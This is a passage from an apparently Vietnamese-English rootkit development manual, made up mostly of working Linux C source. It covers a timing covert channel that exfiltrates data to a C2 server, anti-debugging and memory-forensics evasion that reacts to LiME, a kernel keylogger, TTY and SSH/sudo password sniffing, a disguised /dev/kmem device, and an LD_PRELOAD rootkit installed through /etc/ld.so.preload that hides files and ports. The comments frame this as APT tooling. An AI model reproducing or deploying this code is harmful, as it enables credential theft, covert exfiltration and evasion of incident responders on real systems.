#define TIMING_BIT_0_MS   50   /* Delay cho bit 0 */
#define TIMING_SYNC_MS   200   /* Sync pulse (start of byte) */

/* ── Send single bit qua timing ── */
static int timing_send_bit(struct socket *sock,
                            struct sockaddr_in *dest,
                            int bit)
{
    /* Delay = encode bit value */
    msleep(bit ? TIMING_BIT_1_MS : TIMING_BIT_0_MS);

    /* Send innocuous packet (ICMP ping hoặc DNS query) */
    char payload[] = "AAAA";
    struct msghdr msg = { 0 };
    struct kvec iov = { .iov_base = payload, .iov_len = 4 };
    msg.msg_name = dest;
    msg.msg_namelen = sizeof(*dest);

    return kernel_sendmsg(sock, &msg, &iov, 1, 4);
}

/* ── Send byte (8 bits) qua timing channel ── */
static int timing_send_byte(struct socket *sock,
                              struct sockaddr_in *dest,
                              unsigned char byte)
{
    int i;

    /* Sync pulse: longer delay signals start of byte.
     * Receiver calibrate timing từ sync pulse. */
    msleep(TIMING_SYNC_MS);

    /* MSB first */
    for (i = 7; i >= 0; i--) {
        int bit = (byte >> i) & 1;
        timing_send_bit(sock, dest, bit);
    }

    return 0;
}

/* ── Exfiltrate data qua timing channel ── */
static int rk_timing_exfil(__be32 c2_ip, __be16 c2_port,
                             const void *data, int data_len)
{
    struct socket *sock;
    struct sockaddr_in dest;
    const unsigned char *bytes = data;
    int i, ret;

    ret = sock_create_kern(&init_net, AF_INET, SOCK_DGRAM,
                            IPPROTO_UDP, &sock);
    if (ret < 0) return ret;

    memset(&dest, 0, sizeof(dest));
    dest.sin_family = AF_INET;
    dest.sin_addr.s_addr = c2_ip;
    dest.sin_port = c2_port;

    /* Send length header (4 bytes) */
    for (i = 0; i < 4; i++)
        timing_send_byte(sock, &dest, (data_len >> (24 - i * 8)) & 0xFF);

    /* Send data bytes */
    for (i = 0; i < data_len; i++) {
        timing_send_byte(sock, &dest, bytes[i]);

        /* Yield CPU periodically — prevent soft lockup warning.
         * schedule() cho phép kernel chạy other tasks. */
        if (i % 10 == 0)
            schedule();
    }

    sock_release(sock);
    return 0;
}
```

---

## Appendix F: Advanced Anti-Forensics

### F.1 Code Integrity Self-Check

```c
/* code_integrity.c — Rootkit tự kiểm tra code integrity
 *
 * Detect nếu analyst hoặc tool đã patch/modify rootkit code:
 *   - Breakpoint (0xCC INT3) inject bởi debugger
 *   - Byte modification bởi LKRG hoặc manual patching
 *   - Function redirection (hook on our hooks)
 *
 * Method: hash rootkit code pages, periodically verify.
 */

#include "rootkit.h"
#include <crypto/hash.h>       /* shash API */

#define HASH_ALGO  "sha256"
#define HASH_SIZE  32   /* SHA-256 = 32 bytes */

static u8 code_hash_saved[HASH_SIZE];
static bool hash_initialized = false;

/* ── Compute SHA-256 hash of module code section ── */
static int compute_module_hash(u8 *hash_out)
{
    struct crypto_shash *tfm;
    struct shash_desc *desc;
    int desc_size, ret;
    void *code_start;
    unsigned int code_size;

    /* Module code location:
     *   THIS_MODULE->core_layout.base = start of module memory
     *   THIS_MODULE->core_layout.text_size = size of code (.text) section
     *
     * Chỉ hash code section (không hash data — data thay đổi bình thường). */
    code_start = THIS_MODULE->core_layout.base;
    code_size  = THIS_MODULE->core_layout.text_size;

    /* Allocate SHA-256 transform */
    tfm = crypto_alloc_shash(HASH_ALGO, 0, 0);
    if (IS_ERR(tfm)) return PTR_ERR(tfm);

    desc_size = sizeof(*desc) + crypto_shash_descsize(tfm);
    desc = kzalloc(desc_size, GFP_KERNEL);
    if (!desc) {
        crypto_free_shash(tfm);
        return -ENOMEM;
    }
    desc->tfm = tfm;

    /* Compute hash */
    ret = crypto_shash_init(desc);
    if (ret) goto out;

    ret = crypto_shash_update(desc, code_start, code_size);
    if (ret) goto out;

    ret = crypto_shash_final(desc, hash_out);

out:
    kfree(desc);
    crypto_free_shash(tfm);
    return ret;
}

/* ── Initialize: save hash ngay sau module load ── */
int rk_integrity_init(void)
{
    int ret = compute_module_hash(code_hash_saved);
    if (ret == 0)
        hash_initialized = true;
    return ret;
}

/* ── Verify: so sánh hash hiện tại với saved ──
 *
 * Gọi periodically từ watchdog thread.
 * Nếu mismatch → code đã bị tamper.
 */
bool rk_integrity_check(void)
{
    u8 current_hash[HASH_SIZE];
    int ret;

    if (!hash_initialized)
        return true;

    ret = compute_module_hash(current_hash);
    if (ret)
        return true;  /* Hash fail → assume OK (crash prevention) */

    if (memcmp(current_hash, code_hash_saved, HASH_SIZE) != 0) {
        pr_err("rk: CODE INTEGRITY VIOLATION DETECTED\n");

        /* Response options:
         * 1. Re-patch: restore original code từ backup
         * 2. Self-destruct: remove traces and unload
         * 3. Alert: notify C2 server
         * 4. Evade: change behavior (go silent)
         */
        return false;
    }

    return true;  /* Integrity OK */
}

/* ── Scan for breakpoints (0xCC INT3) trong code section ── */
bool rk_detect_breakpoints(void)
{
    unsigned char *code = THIS_MODULE->core_layout.base;
    unsigned int size = THIS_MODULE->core_layout.text_size;
    unsigned int i;
    int bp_count = 0;

    for (i = 0; i < size; i++) {
        if (code[i] == 0xCC) {
            bp_count++;
            /* 0xCC có thể là legitimate instruction (aligned nop)
             * nhưng nhiều 0xCC = debugger breakpoints. */
        }
    }

    /* Threshold: >3 breakpoints = likely debugger */
    if (bp_count > 3) {
        pr_err("rk: %d breakpoints detected in code!\n", bp_count);
        return true;
    }

    return false;
}
```

---

### F.2 Memory Forensics Evasion

```c
/* memory_evasion.c — Evade memory forensics tools
 *
 * Memory forensics tools (Volatility, Rekall) dump RAM và analyze:
 *   - Module list traversal (find hidden modules)
 *   - Syscall table verification (detect hooks)
 *   - Process list cross-referencing
 *   - String/signature scanning in memory
 *
 * Evasion techniques:
 *   1. Clear sensitive strings từ module memory
 *   2. Relocate code ngoài module address range
 *   3. Manipulate module metadata structures
 *   4. Clear freed slab caches (destroy forensic artifacts)
 *   5. Detect LiME (memory dump tool) loading
 */

#include "rootkit.h"
#include <linux/vmalloc.h>
#include <linux/slab.h>

/* ══════════════════════════════════════════════════════════════
 * Technique 1: Scrub strings từ module memory
 *
 * Volatility signature scan tìm strings: "rootkit", "hidden",
 * "sys_call_table", magic values, etc.
 *
 * Sau khi init xong: zero out strings không còn cần.
 * Giữ lại function pointers (code vẫn cần).
 * ══════════════════════════════════════════════════════════════ */
static void rk_scrub_module_strings(void)
{
    /* Module .rodata section chứa string literals.
     *
     * THIS_MODULE->core_layout.base = module start
     * THIS_MODULE->core_layout.ro_size = read-only section size
     *   (includes .text + .rodata)
     * THIS_MODULE->core_layout.text_size = .text only
     *
     * .rodata nằm từ text_size → ro_size.
     */
    unsigned long rodata_start =
        (unsigned long)THIS_MODULE->core_layout.base +
        THIS_MODULE->core_layout.text_size;
    unsigned long rodata_size =
        THIS_MODULE->core_layout.ro_size -
        THIS_MODULE->core_layout.text_size;

    /* Make rodata writable temporarily */
    set_memory_rw(rodata_start & PAGE_MASK,
                   (rodata_size >> PAGE_SHIFT) + 1);

    /* Zero specific patterns — NOT toàn bộ (sẽ crash vì
     * một số strings vẫn được reference). */
    char *scan = (char *)rodata_start;
    unsigned long i;
    for (i = 0; i < rodata_size - 8; i++) {
        /* Zero out sensitive strings */
        if (memcmp(scan + i, "rootkit", 7) == 0 ||
            memcmp(scan + i, "rk_hook", 7) == 0 ||
            memcmp(scan + i, "backdoor", 8) == 0)
            memset(scan + i, 0, 8);
    }

    /* Restore read-only */
    set_memory_ro(rodata_start & PAGE_MASK,
                   (rodata_size >> PAGE_SHIFT) + 1);
}

/* ══════════════════════════════════════════════════════════════
 * Technique 2: Relocate hook handlers ngoài module range
 *
 * Volatility kiểm tra: "does syscall table entry point INTO
 * a known module address range?"
 * Nếu entry trỏ vào module range → flagged.
 * Nếu entry trỏ vào vmalloc range mà KHÔNG thuộc module → stealth.
 *
 * Copy hook function code vào vmalloc'd executable memory.
 * Syscall table entry trỏ tới vmalloc region.
 * Volatility thấy entry trỏ ra ngoài module list → confused.
 * ══════════════════════════════════════════════════════════════ */
static void *rk_relocate_handler(void *original_handler,
                                   unsigned int handler_size)
{
    void *relocated;

    /* Allocate executable memory NGOÀI module range.
     *
     * __vmalloc: allocate với specific flags.
     * PAGE_KERNEL_EXEC: readable + writable + executable.
     *
     * Memory nằm trong vmalloc range (0xffffc90000000000...)
     * nhưng KHÔNG thuộc bất kỳ module nào.
     */
    relocated = __vmalloc(handler_size, GFP_KERNEL);
    if (!relocated) return NULL;

    /* Copy handler code */
    memcpy(relocated, original_handler, handler_size);

    /* Make executable */
    set_memory_x((unsigned long)relocated & PAGE_MASK,
                  (handler_size >> PAGE_SHIFT) + 1);

    return relocated;
}

/* ══════════════════════════════════════════════════════════════
 * Technique 3: Detect LiME module loading
 *
 * LiME (Linux Memory Extractor) = kernel module dump RAM.
 * Nếu LiME load → analyst đang acquire memory dump.
 *
 * Detection: monitor module loading events.
 * Response: cleanup sensitive data TRƯỚC dump hoàn thành.
 * ══════════════════════════════════════════════════════════════ */
static int rk_module_notify(struct notifier_block *nb,
                              unsigned long action, void *data)
{
    struct module *mod = data;

    if (action == MODULE_STATE_COMING) {
        /* Module đang load. Check tên. */
        if (strstr(mod->name, "lime") ||
            strstr(mod->name, "avml") ||
            strstr(mod->name, "pmem") ||
            strstr(mod->name, "fmem")) {
            pr_info("rk: memory acquisition tool detected: %s\n",
                    mod->name);

            /* EMERGENCY: scrub sensitive data */
            rk_scrub_module_strings();
        }
    }

    return NOTIFY_DONE;
}

static struct notifier_block rk_mod_nb = {
    .notifier_call = rk_module_notify,
    .priority = INT_MAX,  /* Run FIRST */
};

/* Register: register_module_notifier(&rk_mod_nb);
 * Unregister: unregister_module_notifier(&rk_mod_nb); */
```

---

## Appendix G: Credential Theft

### G.1 Keylogger

```c
/* keylogger.c — Kernel-level keyboard input interception
 *
 * 2 methods:
 *   A) Input subsystem handler (input_register_handler)
 *   B) TTY layer hook (tty_operations read/write)
 *
 * Method A ưu tiên vì:
 *   - Capture ALL keyboard input (including passwords, SSH)
 *   - Có keycodes trước mọi userspace processing
 *   - Kernel API chính thức, stable across versions
 *   - Hoạt động cho cả virtual terminals và X11/Wayland
 */

#include "rootkit.h"
#include <linux/input.h>     /* input_dev, input_handler, input_event */
#include <linux/keyboard.h>  /* keyboard notifier */

/* ══════════════════════════════════════════════════════════════
 * Method A: Keyboard notifier
 *
 * Linux input subsystem:
 *   Hardware (keyboard) → input_dev → input_handler → userspace
 *
 * register_keyboard_notifier: API nhận mọi keyboard events.
 * Simpler than input_handler — chỉ cho keyboard, không cần
 * match input devices.
 *
 * Key event types:
 *   KBD_KEYSYM = translated keysym value
 *   KBD_KEYCODE = raw scancode
 *
 * Dùng KBD_KEYSYM vì param->value = Unicode/ASCII keysym value
 * trực tiếp. Cho printable ASCII (0x20-0x7E), keysym = ASCII code.
 * ══════════════════════════════════════════════════════════════ */

#define LOG_BUF_SIZE 4096
static char key_buf[LOG_BUF_SIZE];
static int key_buf_pos = 0;
static DEFINE_SPINLOCK(key_lock);

/* Deferred write buffer — keyboard notifier chạy trong interrupt context,
 * không thể gọi filp_open/kernel_write trực tiếp.
 * Copy vào deferred buffer → workqueue ghi file. */
static char deferred_buf[LOG_BUF_SIZE];
static int deferred_len = 0;
static DEFINE_SPINLOCK(defer_lock);

static void keylog_work_fn(struct work_struct *work);
static DECLARE_WORK(keylog_work, keylog_work_fn);

/* ── Keyboard notifier callback ── */
static int rk_keyboard_notify(struct notifier_block *nb,
                                unsigned long action, void *data)
{
    struct keyboard_notifier_param *param = data;

    /* KBD_KEYSYM: param->value = Unicode/ASCII keysym value.
     * For printable ASCII: value = ASCII code directly. */
    if (action != KBD_KEYSYM || !param->down)
        return NOTIFY_DONE;

    unsigned int keysym = param->value;
    char ch = 0;

    /* Keysym to character conversion.
     * For basic ASCII (0x20-0x7E), keysym = ASCII value. */
    if (keysym >= 0x20 && keysym <= 0x7E) {
        ch = (char)keysym;
    } else if (keysym == 0x0D || keysym == 0x0A) {
        ch = '\n';
    } else if (keysym == 0x09) {
        ch = '\t';
    } else if (keysym == 0x08 || keysym == 0x7F) {
        ch = '\b';
    } else {
        return NOTIFY_DONE;  /* Non-printable, skip */
    }

    /* Append to buffer */
    spin_lock(&key_lock);
    if (key_buf_pos < LOG_BUF_SIZE - 1)
        key_buf[key_buf_pos++] = ch;
    spin_unlock(&key_lock);

    /* Flush buffer khi full hoặc ENTER pressed */
    if (key_buf_pos > LOG_BUF_SIZE - 64 || ch == '\n') {
        spin_lock(&defer_lock);
        memcpy(deferred_buf, key_buf, key_buf_pos);
        deferred_len = key_buf_pos;
        key_buf_pos = 0;
        spin_unlock(&defer_lock);
        schedule_work(&keylog_work);
    }

    return NOTIFY_DONE;
}

static struct notifier_block rk_kb_nb = {
    .notifier_call = rk_keyboard_notify,
};

/* ── Workqueue handler: copy buffer under lock, then write ──
 *
 * Keyboard notifier chạy trong interrupt context.
 * Workqueue chạy trong process context → có thể gọi file I/O.
 * Copy deferred_buf to local buffer dưới spin_lock trước khi write.
 */
static void keylog_work_fn(struct work_struct *work)
{
    struct file *f;
    char local_buf[LOG_BUF_SIZE];
    int local_len;

    /* Copy under lock — tránh race với keyboard notifier */
    spin_lock(&defer_lock);
    if (deferred_len <= 0) {
        spin_unlock(&defer_lock);
        return;
    }
    local_len = deferred_len;
    memcpy(local_buf, deferred_buf, local_len);
    deferred_len = 0;
    spin_unlock(&defer_lock);

    /* Write LOCAL copy — no race possible */
    f = filp_open("/tmp/.rk_keys", O_WRONLY | O_CREAT | O_APPEND, 0600);
    if (!IS_ERR(f)) {
        kernel_write(f, local_buf, local_len, &f->f_pos);
        filp_close(f, NULL);
    }
}

/* Install: register_keyboard_notifier(&rk_kb_nb);
 * Remove:  unregister_keyboard_notifier(&rk_kb_nb);
 *          cancel_work_sync(&keylog_work); */
```

---

### G.2 Credential Harvesting (TTY Sniffing)

```c
/* cred_harvest.c — Intercept authentication credentials
 *
 * Target functions:
 *   1. pam_authenticate → PAM-based auth (SSH, sudo, login, su)
 *   2. unix_verify_password → /etc/shadow password check
 *   3. crypto hash compare → generic credential check
 *
 * Approach: Kprobe on authentication functions, extract
 * username + password TRƯỚC hash/verify.
 *
 * APT relevance: mọi APT kit thu thập credentials.
 * Credentials = lateral movement capability.
 */

#include "rootkit.h"
#include <linux/kprobes.h>

#define CRED_LOG_PATH "/tmp/.rk_creds"

/* ── Log captured credential ── */
static void rk_log_credential(const char *source,
                                const char *username,
                                const char *password)
{
    struct file *f;
    char buf[512];
    loff_t pos = 0;
    int len;

    len = snprintf(buf, sizeof(buf), "[%s] user=%s pass=%s\n",
                   source, username, password ? password : "(null)");

    f = filp_open(CRED_LOG_PATH, O_WRONLY | O_CREAT | O_APPEND, 0600);
    if (!IS_ERR(f)) {
        kernel_write(f, buf, len, &pos);
        filp_close(f, NULL);
    }
}

/* ══════════════════════════════════════════════════════════════
 * Method 1: Hook sys_openat cho /etc/shadow reads
 *
 * Khi PAM authenticate: nó read /etc/shadow.
 * Detect: monitor openat() cho /etc/shadow → log calling process.
 * Không capture password trực tiếp nhưng identify auth attempts.
 * ══════════════════════════════════════════════════════════════ */

/* ══════════════════════════════════════════════════════════════
 * Method 2: TTY sniffing via kretprobe — Capture password từ SSH/sudo
 *
 * Khi user type password (SSH login, sudo prompt):
 *   1. Terminal echo disabled (ICANON off, ECHO off)
 *   2. User type password → chars go through tty_operations
 *   3. tty->ops->write() ghi chars vào tty buffer
 *   4. Process read() từ tty fd
 *
 * Hook tty_read via kretprobe: capture chars TRƯỚC process đọc.
 * Detect password input: TTY echo off → likely password prompt.
 *
 * tty_read signature changed at kernel 5.10:
 *   Kernel < 5.10:
 *     ssize_t tty_read(struct file *file, char __user *buf,
 *                      size_t count, loff_t *ppos)
 *   Kernel >= 5.10:
 *     ssize_t tty_read(struct kiocb *iocb, struct iov_iter *to)
 *
 * Dùng kretprobe approach để tránh signature issues.
 * Entry handler save buffer pointer, return handler capture data.
 * ══════════════════════════════════════════════════════════════ */

struct tty_sniff_data {
    char __user *buf;
    size_t count;
};

static struct kretprobe tty_read_kretprobe;

static int tty_read_entry(struct kretprobe_instance *ri,
                            struct pt_regs *regs)
{
    /* Save buffer pointer for return handler.
     * On < 5.10: arg2 = buf, arg3 = count.
     * On >= 5.10: arg1 = kiocb, arg2 = iov_iter. */
    struct tty_sniff_data *data = (void *)ri->data;

#if LINUX_VERSION_CODE >= KERNEL_VERSION(5, 10, 0)
    /* arg1 = struct kiocb *, arg2 = struct iov_iter * */
    struct iov_iter *iter = (struct iov_iter *)regs->si;
    data->buf = NULL;  /* Complex — need iov_iter_first_page */
    data->count = 0;
#else
    data->buf = (char __user *)regs->si;
    data->count = (size_t)regs->dx;
#endif

    return 0;
}

static int tty_read_return(struct kretprobe_instance *ri,
                             struct pt_regs *regs)
{
    struct tty_sniff_data *data = (void *)ri->data;
    ssize_t ret = regs_return_value(regs);
    char kern_buf[256];
    int copy_len;

    if (ret <= 0 || !data->buf) return 0;

    copy_len = min((ssize_t)sizeof(kern_buf) - 1, ret);
    if (copy_from_user(kern_buf, data->buf, copy_len))
        return 0;
    kern_buf[copy_len] = '\0';

    /* Log captured input — check for password patterns.
     * Nếu echo disabled trên TTY = password entry.
     * Tích hợp với rk_log_credential() để log. */
    rk_log_credential("tty_sniff", current->comm, kern_buf);

    return 0;
}

/* Setup kretprobe:
 *
 * tty_read_kretprobe.kp.symbol_name = "tty_read";
 * tty_read_kretprobe.handler = tty_read_return;
 * tty_read_kretprobe.entry_handler = tty_read_entry;
 * tty_read_kretprobe.data_size = sizeof(struct tty_sniff_data);
 * tty_read_kretprobe.maxactive = 20;
 * register_kretprobe(&tty_read_kretprobe);
 */

/* ══════════════════════════════════════════════════════════════
 * Method 3: Kprobe trên specific auth functions
 *
 * Hook internal functions gọi khi authenticate:
 *   - vfs_read on /etc/shadow
 *   - Hook process execution of sshd, sudo, su
 *
 * Khi sshd process đang chạy + read from tty → capture.
 * ══════════════════════════════════════════════════════════════ */

static int ssh_auth_handler(struct kprobe *p, struct pt_regs *regs)
{
    /* Check nếu current process là sshd hoặc sudo */
    if (strcmp(current->comm, "sshd") == 0 ||
        strcmp(current->comm, "sudo") == 0 ||
        strcmp(current->comm, "su") == 0 ||
        strcmp(current->comm, "login") == 0) {
        /* Log authentication attempt */
        rk_log_credential("auth_probe", current->comm, NULL);
    }
    return 0;
}

static struct kprobe auth_kp = {
    .symbol_name = "vfs_read",
    .pre_handler = ssh_auth_handler,
};
/* Register: register_kprobe(&auth_kp); */
```

---

### G.3 /dev/kmem & /dev/mem

```c
/* devkmem.c — Access kernel memory qua character devices
 *
 * /dev/mem:  access physical memory (RAM) trực tiếp
 * /dev/kmem: access kernel virtual memory trực tiếp
 *
 * Classic technique (pre-module era rootkits dùng):
 *   Open /dev/kmem → seek tới kernel address → read/write
 *   → Modify syscall table, credentials, etc.
 *
 * Modern kernels:
 *   - /dev/kmem: disabled (CONFIG_DEVKMEM=n) trên hầu hết distros
 *   - /dev/mem: restricted (CONFIG_STRICT_DEVMEM=y)
 *     chỉ cho access <1MB (BIOS area) và PCI MMIO regions
 *   - Kernel lockdown: block /dev/mem completely
 *
 * Rootkit có thể:
 *   1. Re-enable /dev/kmem (create device node, bypass restriction)
 *   2. Disable CONFIG_STRICT_DEVMEM check tại runtime
 *   3. Dùng /dev/mem + bypass STRICT_DEVMEM
 *
 * Used by: classic rootkits (SucKIT), modern rootkits for
 *          reading kernel memory without standard APIs.
 */

#include "rootkit.h"
#include <linux/mm.h>
#include <linux/io.h>

/* ══════════════════════════════════════════════════════════════
 * Method 1: Read/Write kernel memory qua /dev/mem
 *
 * Physical memory access — bypass nhiều protections.
 * Cần convert virtual address → physical address trước.
 * ══════════════════════════════════════════════════════════════ */

/* ── Virtual → Physical address conversion ── */
static phys_addr_t rk_virt_to_phys(unsigned long vaddr)
{
    pgd_t *pgd;
    p4d_t *p4d;
    pud_t *pud;
    pmd_t *pmd;
    pte_t *pte;

    /* Walk page tables: PGD → P4D → PUD → PMD → PTE → physical */
    pgd = pgd_offset(current->mm ? current->mm : &init_mm, vaddr);
    if (pgd_none(*pgd)) return 0;

    p4d = p4d_offset(pgd, vaddr);
    if (p4d_none(*p4d)) return 0;

    pud = pud_offset(p4d, vaddr);
    if (pud_none(*pud)) return 0;

    /* Check huge page (1GB) */
    if (pud_large(*pud))
        return (pud_pfn(*pud) << PAGE_SHIFT) | (vaddr & ~PUD_MASK);

    pmd = pmd_offset(pud, vaddr);
    if (pmd_none(*pmd)) return 0;

    /* Check huge page (2MB) */
    if (pmd_large(*pmd))
        return (pmd_pfn(*pmd) << PAGE_SHIFT) | (vaddr & ~PMD_MASK);

    pte = pte_offset_kernel(pmd, vaddr);
    if (!pte || pte_none(*pte)) return 0;

    return (pte_pfn(*pte) << PAGE_SHIFT) | (vaddr & ~PAGE_MASK);
}

/* ── Read kernel memory qua physical mapping ──
 *
 * ioremap: map physical address vào kernel virtual address space.
 * Thường dùng cho MMIO (hardware registers).
 * Nhưng có thể map bất kỳ physical address nào — including RAM.
 */
static int rk_read_phys(phys_addr_t phys_addr, void *buf, size_t len)
{
    void __iomem *mapped;

    mapped = ioremap(phys_addr, len);
    if (!mapped) return -ENOMEM;

    memcpy_fromio(buf, mapped, len);
    iounmap(mapped);
    return 0;
}

static int rk_write_phys(phys_addr_t phys_addr, const void *buf, size_t len)
{
    void __iomem *mapped;

    mapped = ioremap(phys_addr, len);
    if (!mapped) return -ENOMEM;

    memcpy_toio(mapped, buf, len);
    iounmap(mapped);
    return 0;
}

/* ══════════════════════════════════════════════════════════════
 * Method 2: Bypass STRICT_DEVMEM
 *
 * CONFIG_STRICT_DEVMEM: devmem_is_allowed() check.
 * Nếu return 0 → access denied.
 * Nếu return 1 → access allowed.
 *
 * Rootkit có thể:
 *   a) Hook devmem_is_allowed() → always return 1
 *   b) Modify variable directly
 * ══════════════════════════════════════════════════════════════ */
static int (*orig_devmem_is_allowed)(unsigned long pfn);

static int rk_devmem_is_allowed(unsigned long pfn)
{
    return 1;  /* Always allow — bypass STRICT_DEVMEM */
}

/* Install via ftrace hook trên devmem_is_allowed */

/* ══════════════════════════════════════════════════════════════
 * Method 3: Re-create /dev/kmem
 *
 * Nếu /dev/kmem không tồn tại (CONFIG_DEVKMEM=n),
 * rootkit có thể tạo character device thay thế
 * với custom file_operations cho phép read/write kernel memory.
 * ══════════════════════════════════════════════════════════════ */

static ssize_t rk_kmem_read(struct file *file, char __user *buf,
                              size_t count, loff_t *ppos)
{
    unsigned long kaddr = (unsigned long)*ppos;
    char *kern_buf;

    /* Validate address range */
    if (kaddr < PAGE_OFFSET)
        return -EFAULT;

    kern_buf = kzalloc(count, GFP_KERNEL);
    if (!kern_buf) return -ENOMEM;

    /* Direct copy từ kernel address */
    if (copy_from_kernel_nofault(kern_buf, (void *)kaddr, count)) {
        kfree(kern_buf);
        return -EFAULT;
    }

    if (copy_to_user(buf, kern_buf, count)) {
        kfree(kern_buf);
        return -EFAULT;
    }

    kfree(kern_buf);
    *ppos += count;
    return count;
}

static ssize_t rk_kmem_write(struct file *file, const char __user *buf,
                               size_t count, loff_t *ppos)
{
    unsigned long kaddr = (unsigned long)*ppos;
    char *kern_buf;

    if (kaddr < PAGE_OFFSET)
        return -EFAULT;

    kern_buf = kzalloc(count, GFP_KERNEL);
    if (!kern_buf) return -ENOMEM;

    if (copy_from_user(kern_buf, buf, count)) {
        kfree(kern_buf);
        return -EFAULT;
    }

    /* Bypass write protection */
    rk_unprotect_memory();
    memcpy((void *)kaddr, kern_buf, count);
    rk_protect_memory();

    kfree(kern_buf);
    *ppos += count;
    return count;
}

static const struct file_operations rk_kmem_fops = {
    .owner = THIS_MODULE,
    .read  = rk_kmem_read,
    .write = rk_kmem_write,
    .llseek = default_llseek,
};

/* Đăng ký misc device tên disguised (không đặt tên "kmem"):
 *
 * static struct miscdevice rk_kmem_dev = {
 *     .minor = MISC_DYNAMIC_MINOR,
 *     .name  = "hwrng_feed",  // disguised name
 *     .fops  = &rk_kmem_fops,
 *     .mode  = 0600,          // root-only access
 * };
 * misc_register(&rk_kmem_dev);
 */
```

---

# Part V — Userspace, Exploitation & Detection

## Appendix H: Userspace Rootkit Techniques

### H.1 LD_PRELOAD Rootkit — Shared library injection {#ld-preload}

```c
/* ld_preload_rootkit.c — Userspace rootkit via shared library
 *
 * COMPILE: gcc -shared -fPIC -o librk.so ld_preload_rootkit.c -ldl
 * INSTALL: echo '/path/to/librk.so' > /etc/ld.so.preload
 *
 * Mechanism:
 *   /etc/ld.so.preload liệt kê shared libraries load TRƯỚC mọi thứ.
 *   Dynamic linker (ld-linux.so) đọc file này → load librk.so
 *   → MỌI process mới chạy đều load librk.so.
 *   → Hàm trong librk.so override hàm trong libc (symbol interposition).
 *
 * Ưu điểm so với kernel rootkit:
 *   - Không cần root để develop/test
 *   - Không cần kernel headers
 *   - Không crash kernel nếu bug
 *   - Hoạt động trên mọi kernel version
 *
 * Nhược điểm:
 *   - Chỉ affect userspace (kernel tools bypass)
 *   - Static-linked binaries không bị affect
 *   - Dễ detect hơn (strace, ltrace, ld.so.preload check)
 *
 * Used by: Azazel, Jynx2, libprocesshider, Umbreon.
 * Kết hợp kernel + userspace rootkit = defense-in-depth.
 */

#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <dlfcn.h>       /* dlsym, RTLD_NEXT */
#include <dirent.h>      /* readdir, struct dirent */
#include <sys/stat.h>    /* stat, lstat */
#include <unistd.h>
#include <pwd.h>         /* getpwnam, getpwent */
#include <errno.h>

#define HIDDEN_PREFIX "rk_"
#define HIDDEN_PORT   4444
#define HIDDEN_USER   "rk_user"

/* ══════════════════════════════════════════════════════════════
 * Hook readdir / readdir64 — Ẩn files và processes
 *
 * ls, find, python os.listdir() đều gọi readdir().
 * Override readdir → filter entries có tên bắt đầu HIDDEN_PREFIX.
 *
 * dlsym(RTLD_NEXT, "readdir"):
 *   Lấy pointer tới ORIGINAL readdir trong libc.
 *   RTLD_NEXT = "tìm symbol ở library KẾ TIẾP trong load order"
 *   → skip librk.so → tìm trong libc.so.
 * ══════════════════════════════════════════════════════════════ */

struct dirent *readdir(DIR *dirp)
{
    /* Lấy original readdir từ libc */
    static struct dirent *(*orig_readdir)(DIR *) = NULL;
    if (!orig_readdir)
        orig_readdir = dlsym(RTLD_NEXT, "readdir");

    struct dirent *entry;

    while ((entry = orig_readdir(dirp)) != NULL) {
        /* Filter: skip entries bắt đầu bằng HIDDEN_PREFIX */
        if (strncmp(entry->d_name, HIDDEN_PREFIX,
                    strlen(HIDDEN_PREFIX)) == 0)
            continue;

        /* Filter: skip hidden PIDs (numeric entries trong /proc) */
        /* (cần track hidden PIDs via shared memory hoặc file) */

        return entry;  /* Visible entry */
    }

    return NULL;  /* End of directory */
}

/* readdir64 — 64-bit version, cần hook cả 2 */
struct dirent64 *readdir64(DIR *dirp)
{
    static struct dirent64 *(*orig)(DIR *) = NULL;
    if (!orig) orig = dlsym(RTLD_NEXT, "readdir64");

    struct dirent64 *entry;
    while ((entry = orig(dirp)) != NULL) {
        if (strncmp(entry->d_name, HIDDEN_PREFIX,
                    strlen(HIDDEN_PREFIX)) == 0)
            continue;
        return entry;
    }
    return NULL;
}

/* ══════════════════════════════════════════════════════════════
 * Hook stat / lstat / access — File existence check
 *
 * Chương trình check file existence:
 *   stat("rk_config", &buf) → -1 ENOENT = "file không tồn tại"
 *
 * Nếu chỉ hook readdir mà không hook stat:
 *   ls → không thấy file (readdir filtered)
 *   cat rk_config → VẪN ĐỌC ĐƯỢC (stat + open work)
 *   → Inconsistency = suspicious
 *
 * Hook stat/lstat/access để trả ENOENT cho hidden files.
 * ══════════════════════════════════════════════════════════════ */

int stat(const char *pathname, struct stat *statbuf)
{
    static int (*orig_stat)(const char *, struct stat *) = NULL;
    if (!orig_stat) orig_stat = dlsym(RTLD_NEXT, "stat");

    /* Check basename (filename part of path) */
    const char *base = strrchr(pathname, '/');
    base = base ? base + 1 : pathname;

    if (strncmp(base, HIDDEN_PREFIX, strlen(HIDDEN_PREFIX)) == 0) {
        errno = ENOENT;
        return -1;
    }

    return orig_stat(pathname, statbuf);
}

int lstat(const char *pathname, struct stat *statbuf)
{
    static int (*orig)(const char *, struct stat *) = NULL;
    if (!orig) orig = dlsym(RTLD_NEXT, "lstat");

    const char *base = strrchr(pathname, '/');
    base = base ? base + 1 : pathname;
    if (strncmp(base, HIDDEN_PREFIX, strlen(HIDDEN_PREFIX)) == 0) {
        errno = ENOENT;
        return -1;
    }
    return orig(pathname, statbuf);
}

/* ══════════════════════════════════════════════════════════════
 * Hook fopen — Block reading hidden files + track /proc/net/tcp
 *
 * Kết hợp 2 chức năng:
 *   1. Block fopen cho files có HIDDEN_PREFIX (ẩn file)
 *   2. Track FILE* pointer cho /proc/net/tcp và /proc/net/tcp6
 *      → dùng trong fgets hook để chỉ filter đúng stream
 * ══════════════════════════════════════════════════════════════ */

static FILE *proc_tcp_fp = NULL;
static FILE *proc_tcp6_fp = NULL;

FILE *fopen(const char *pathname, const char *mode)
{
    static FILE *(*orig)(const char *, const char *) = NULL;
    if (!orig) orig = dlsym(RTLD_NEXT, "fopen");

    /* Block fopen cho hidden files */
    const char *base = strrchr(pathname, '/');
    base = base ? base + 1 : pathname;
    if (strncmp(base, HIDDEN_PREFIX, strlen(HIDDEN_PREFIX)) == 0) {
        errno = ENOENT;
        return NULL;
    }

    FILE *fp = orig(pathname, mode);

    /* Track /proc/net/tcp streams cho fgets filtering */
    if (fp) {
        if (strcmp(pathname, "/proc/net/tcp") == 0)
            proc_tcp_fp = fp;
        else if (strcmp(pathname, "/proc/net/tcp6") == 0)
            proc_tcp6_fp = fp;
    }

    return fp;
}

/* ══════════════════════════════════════════════════════════════
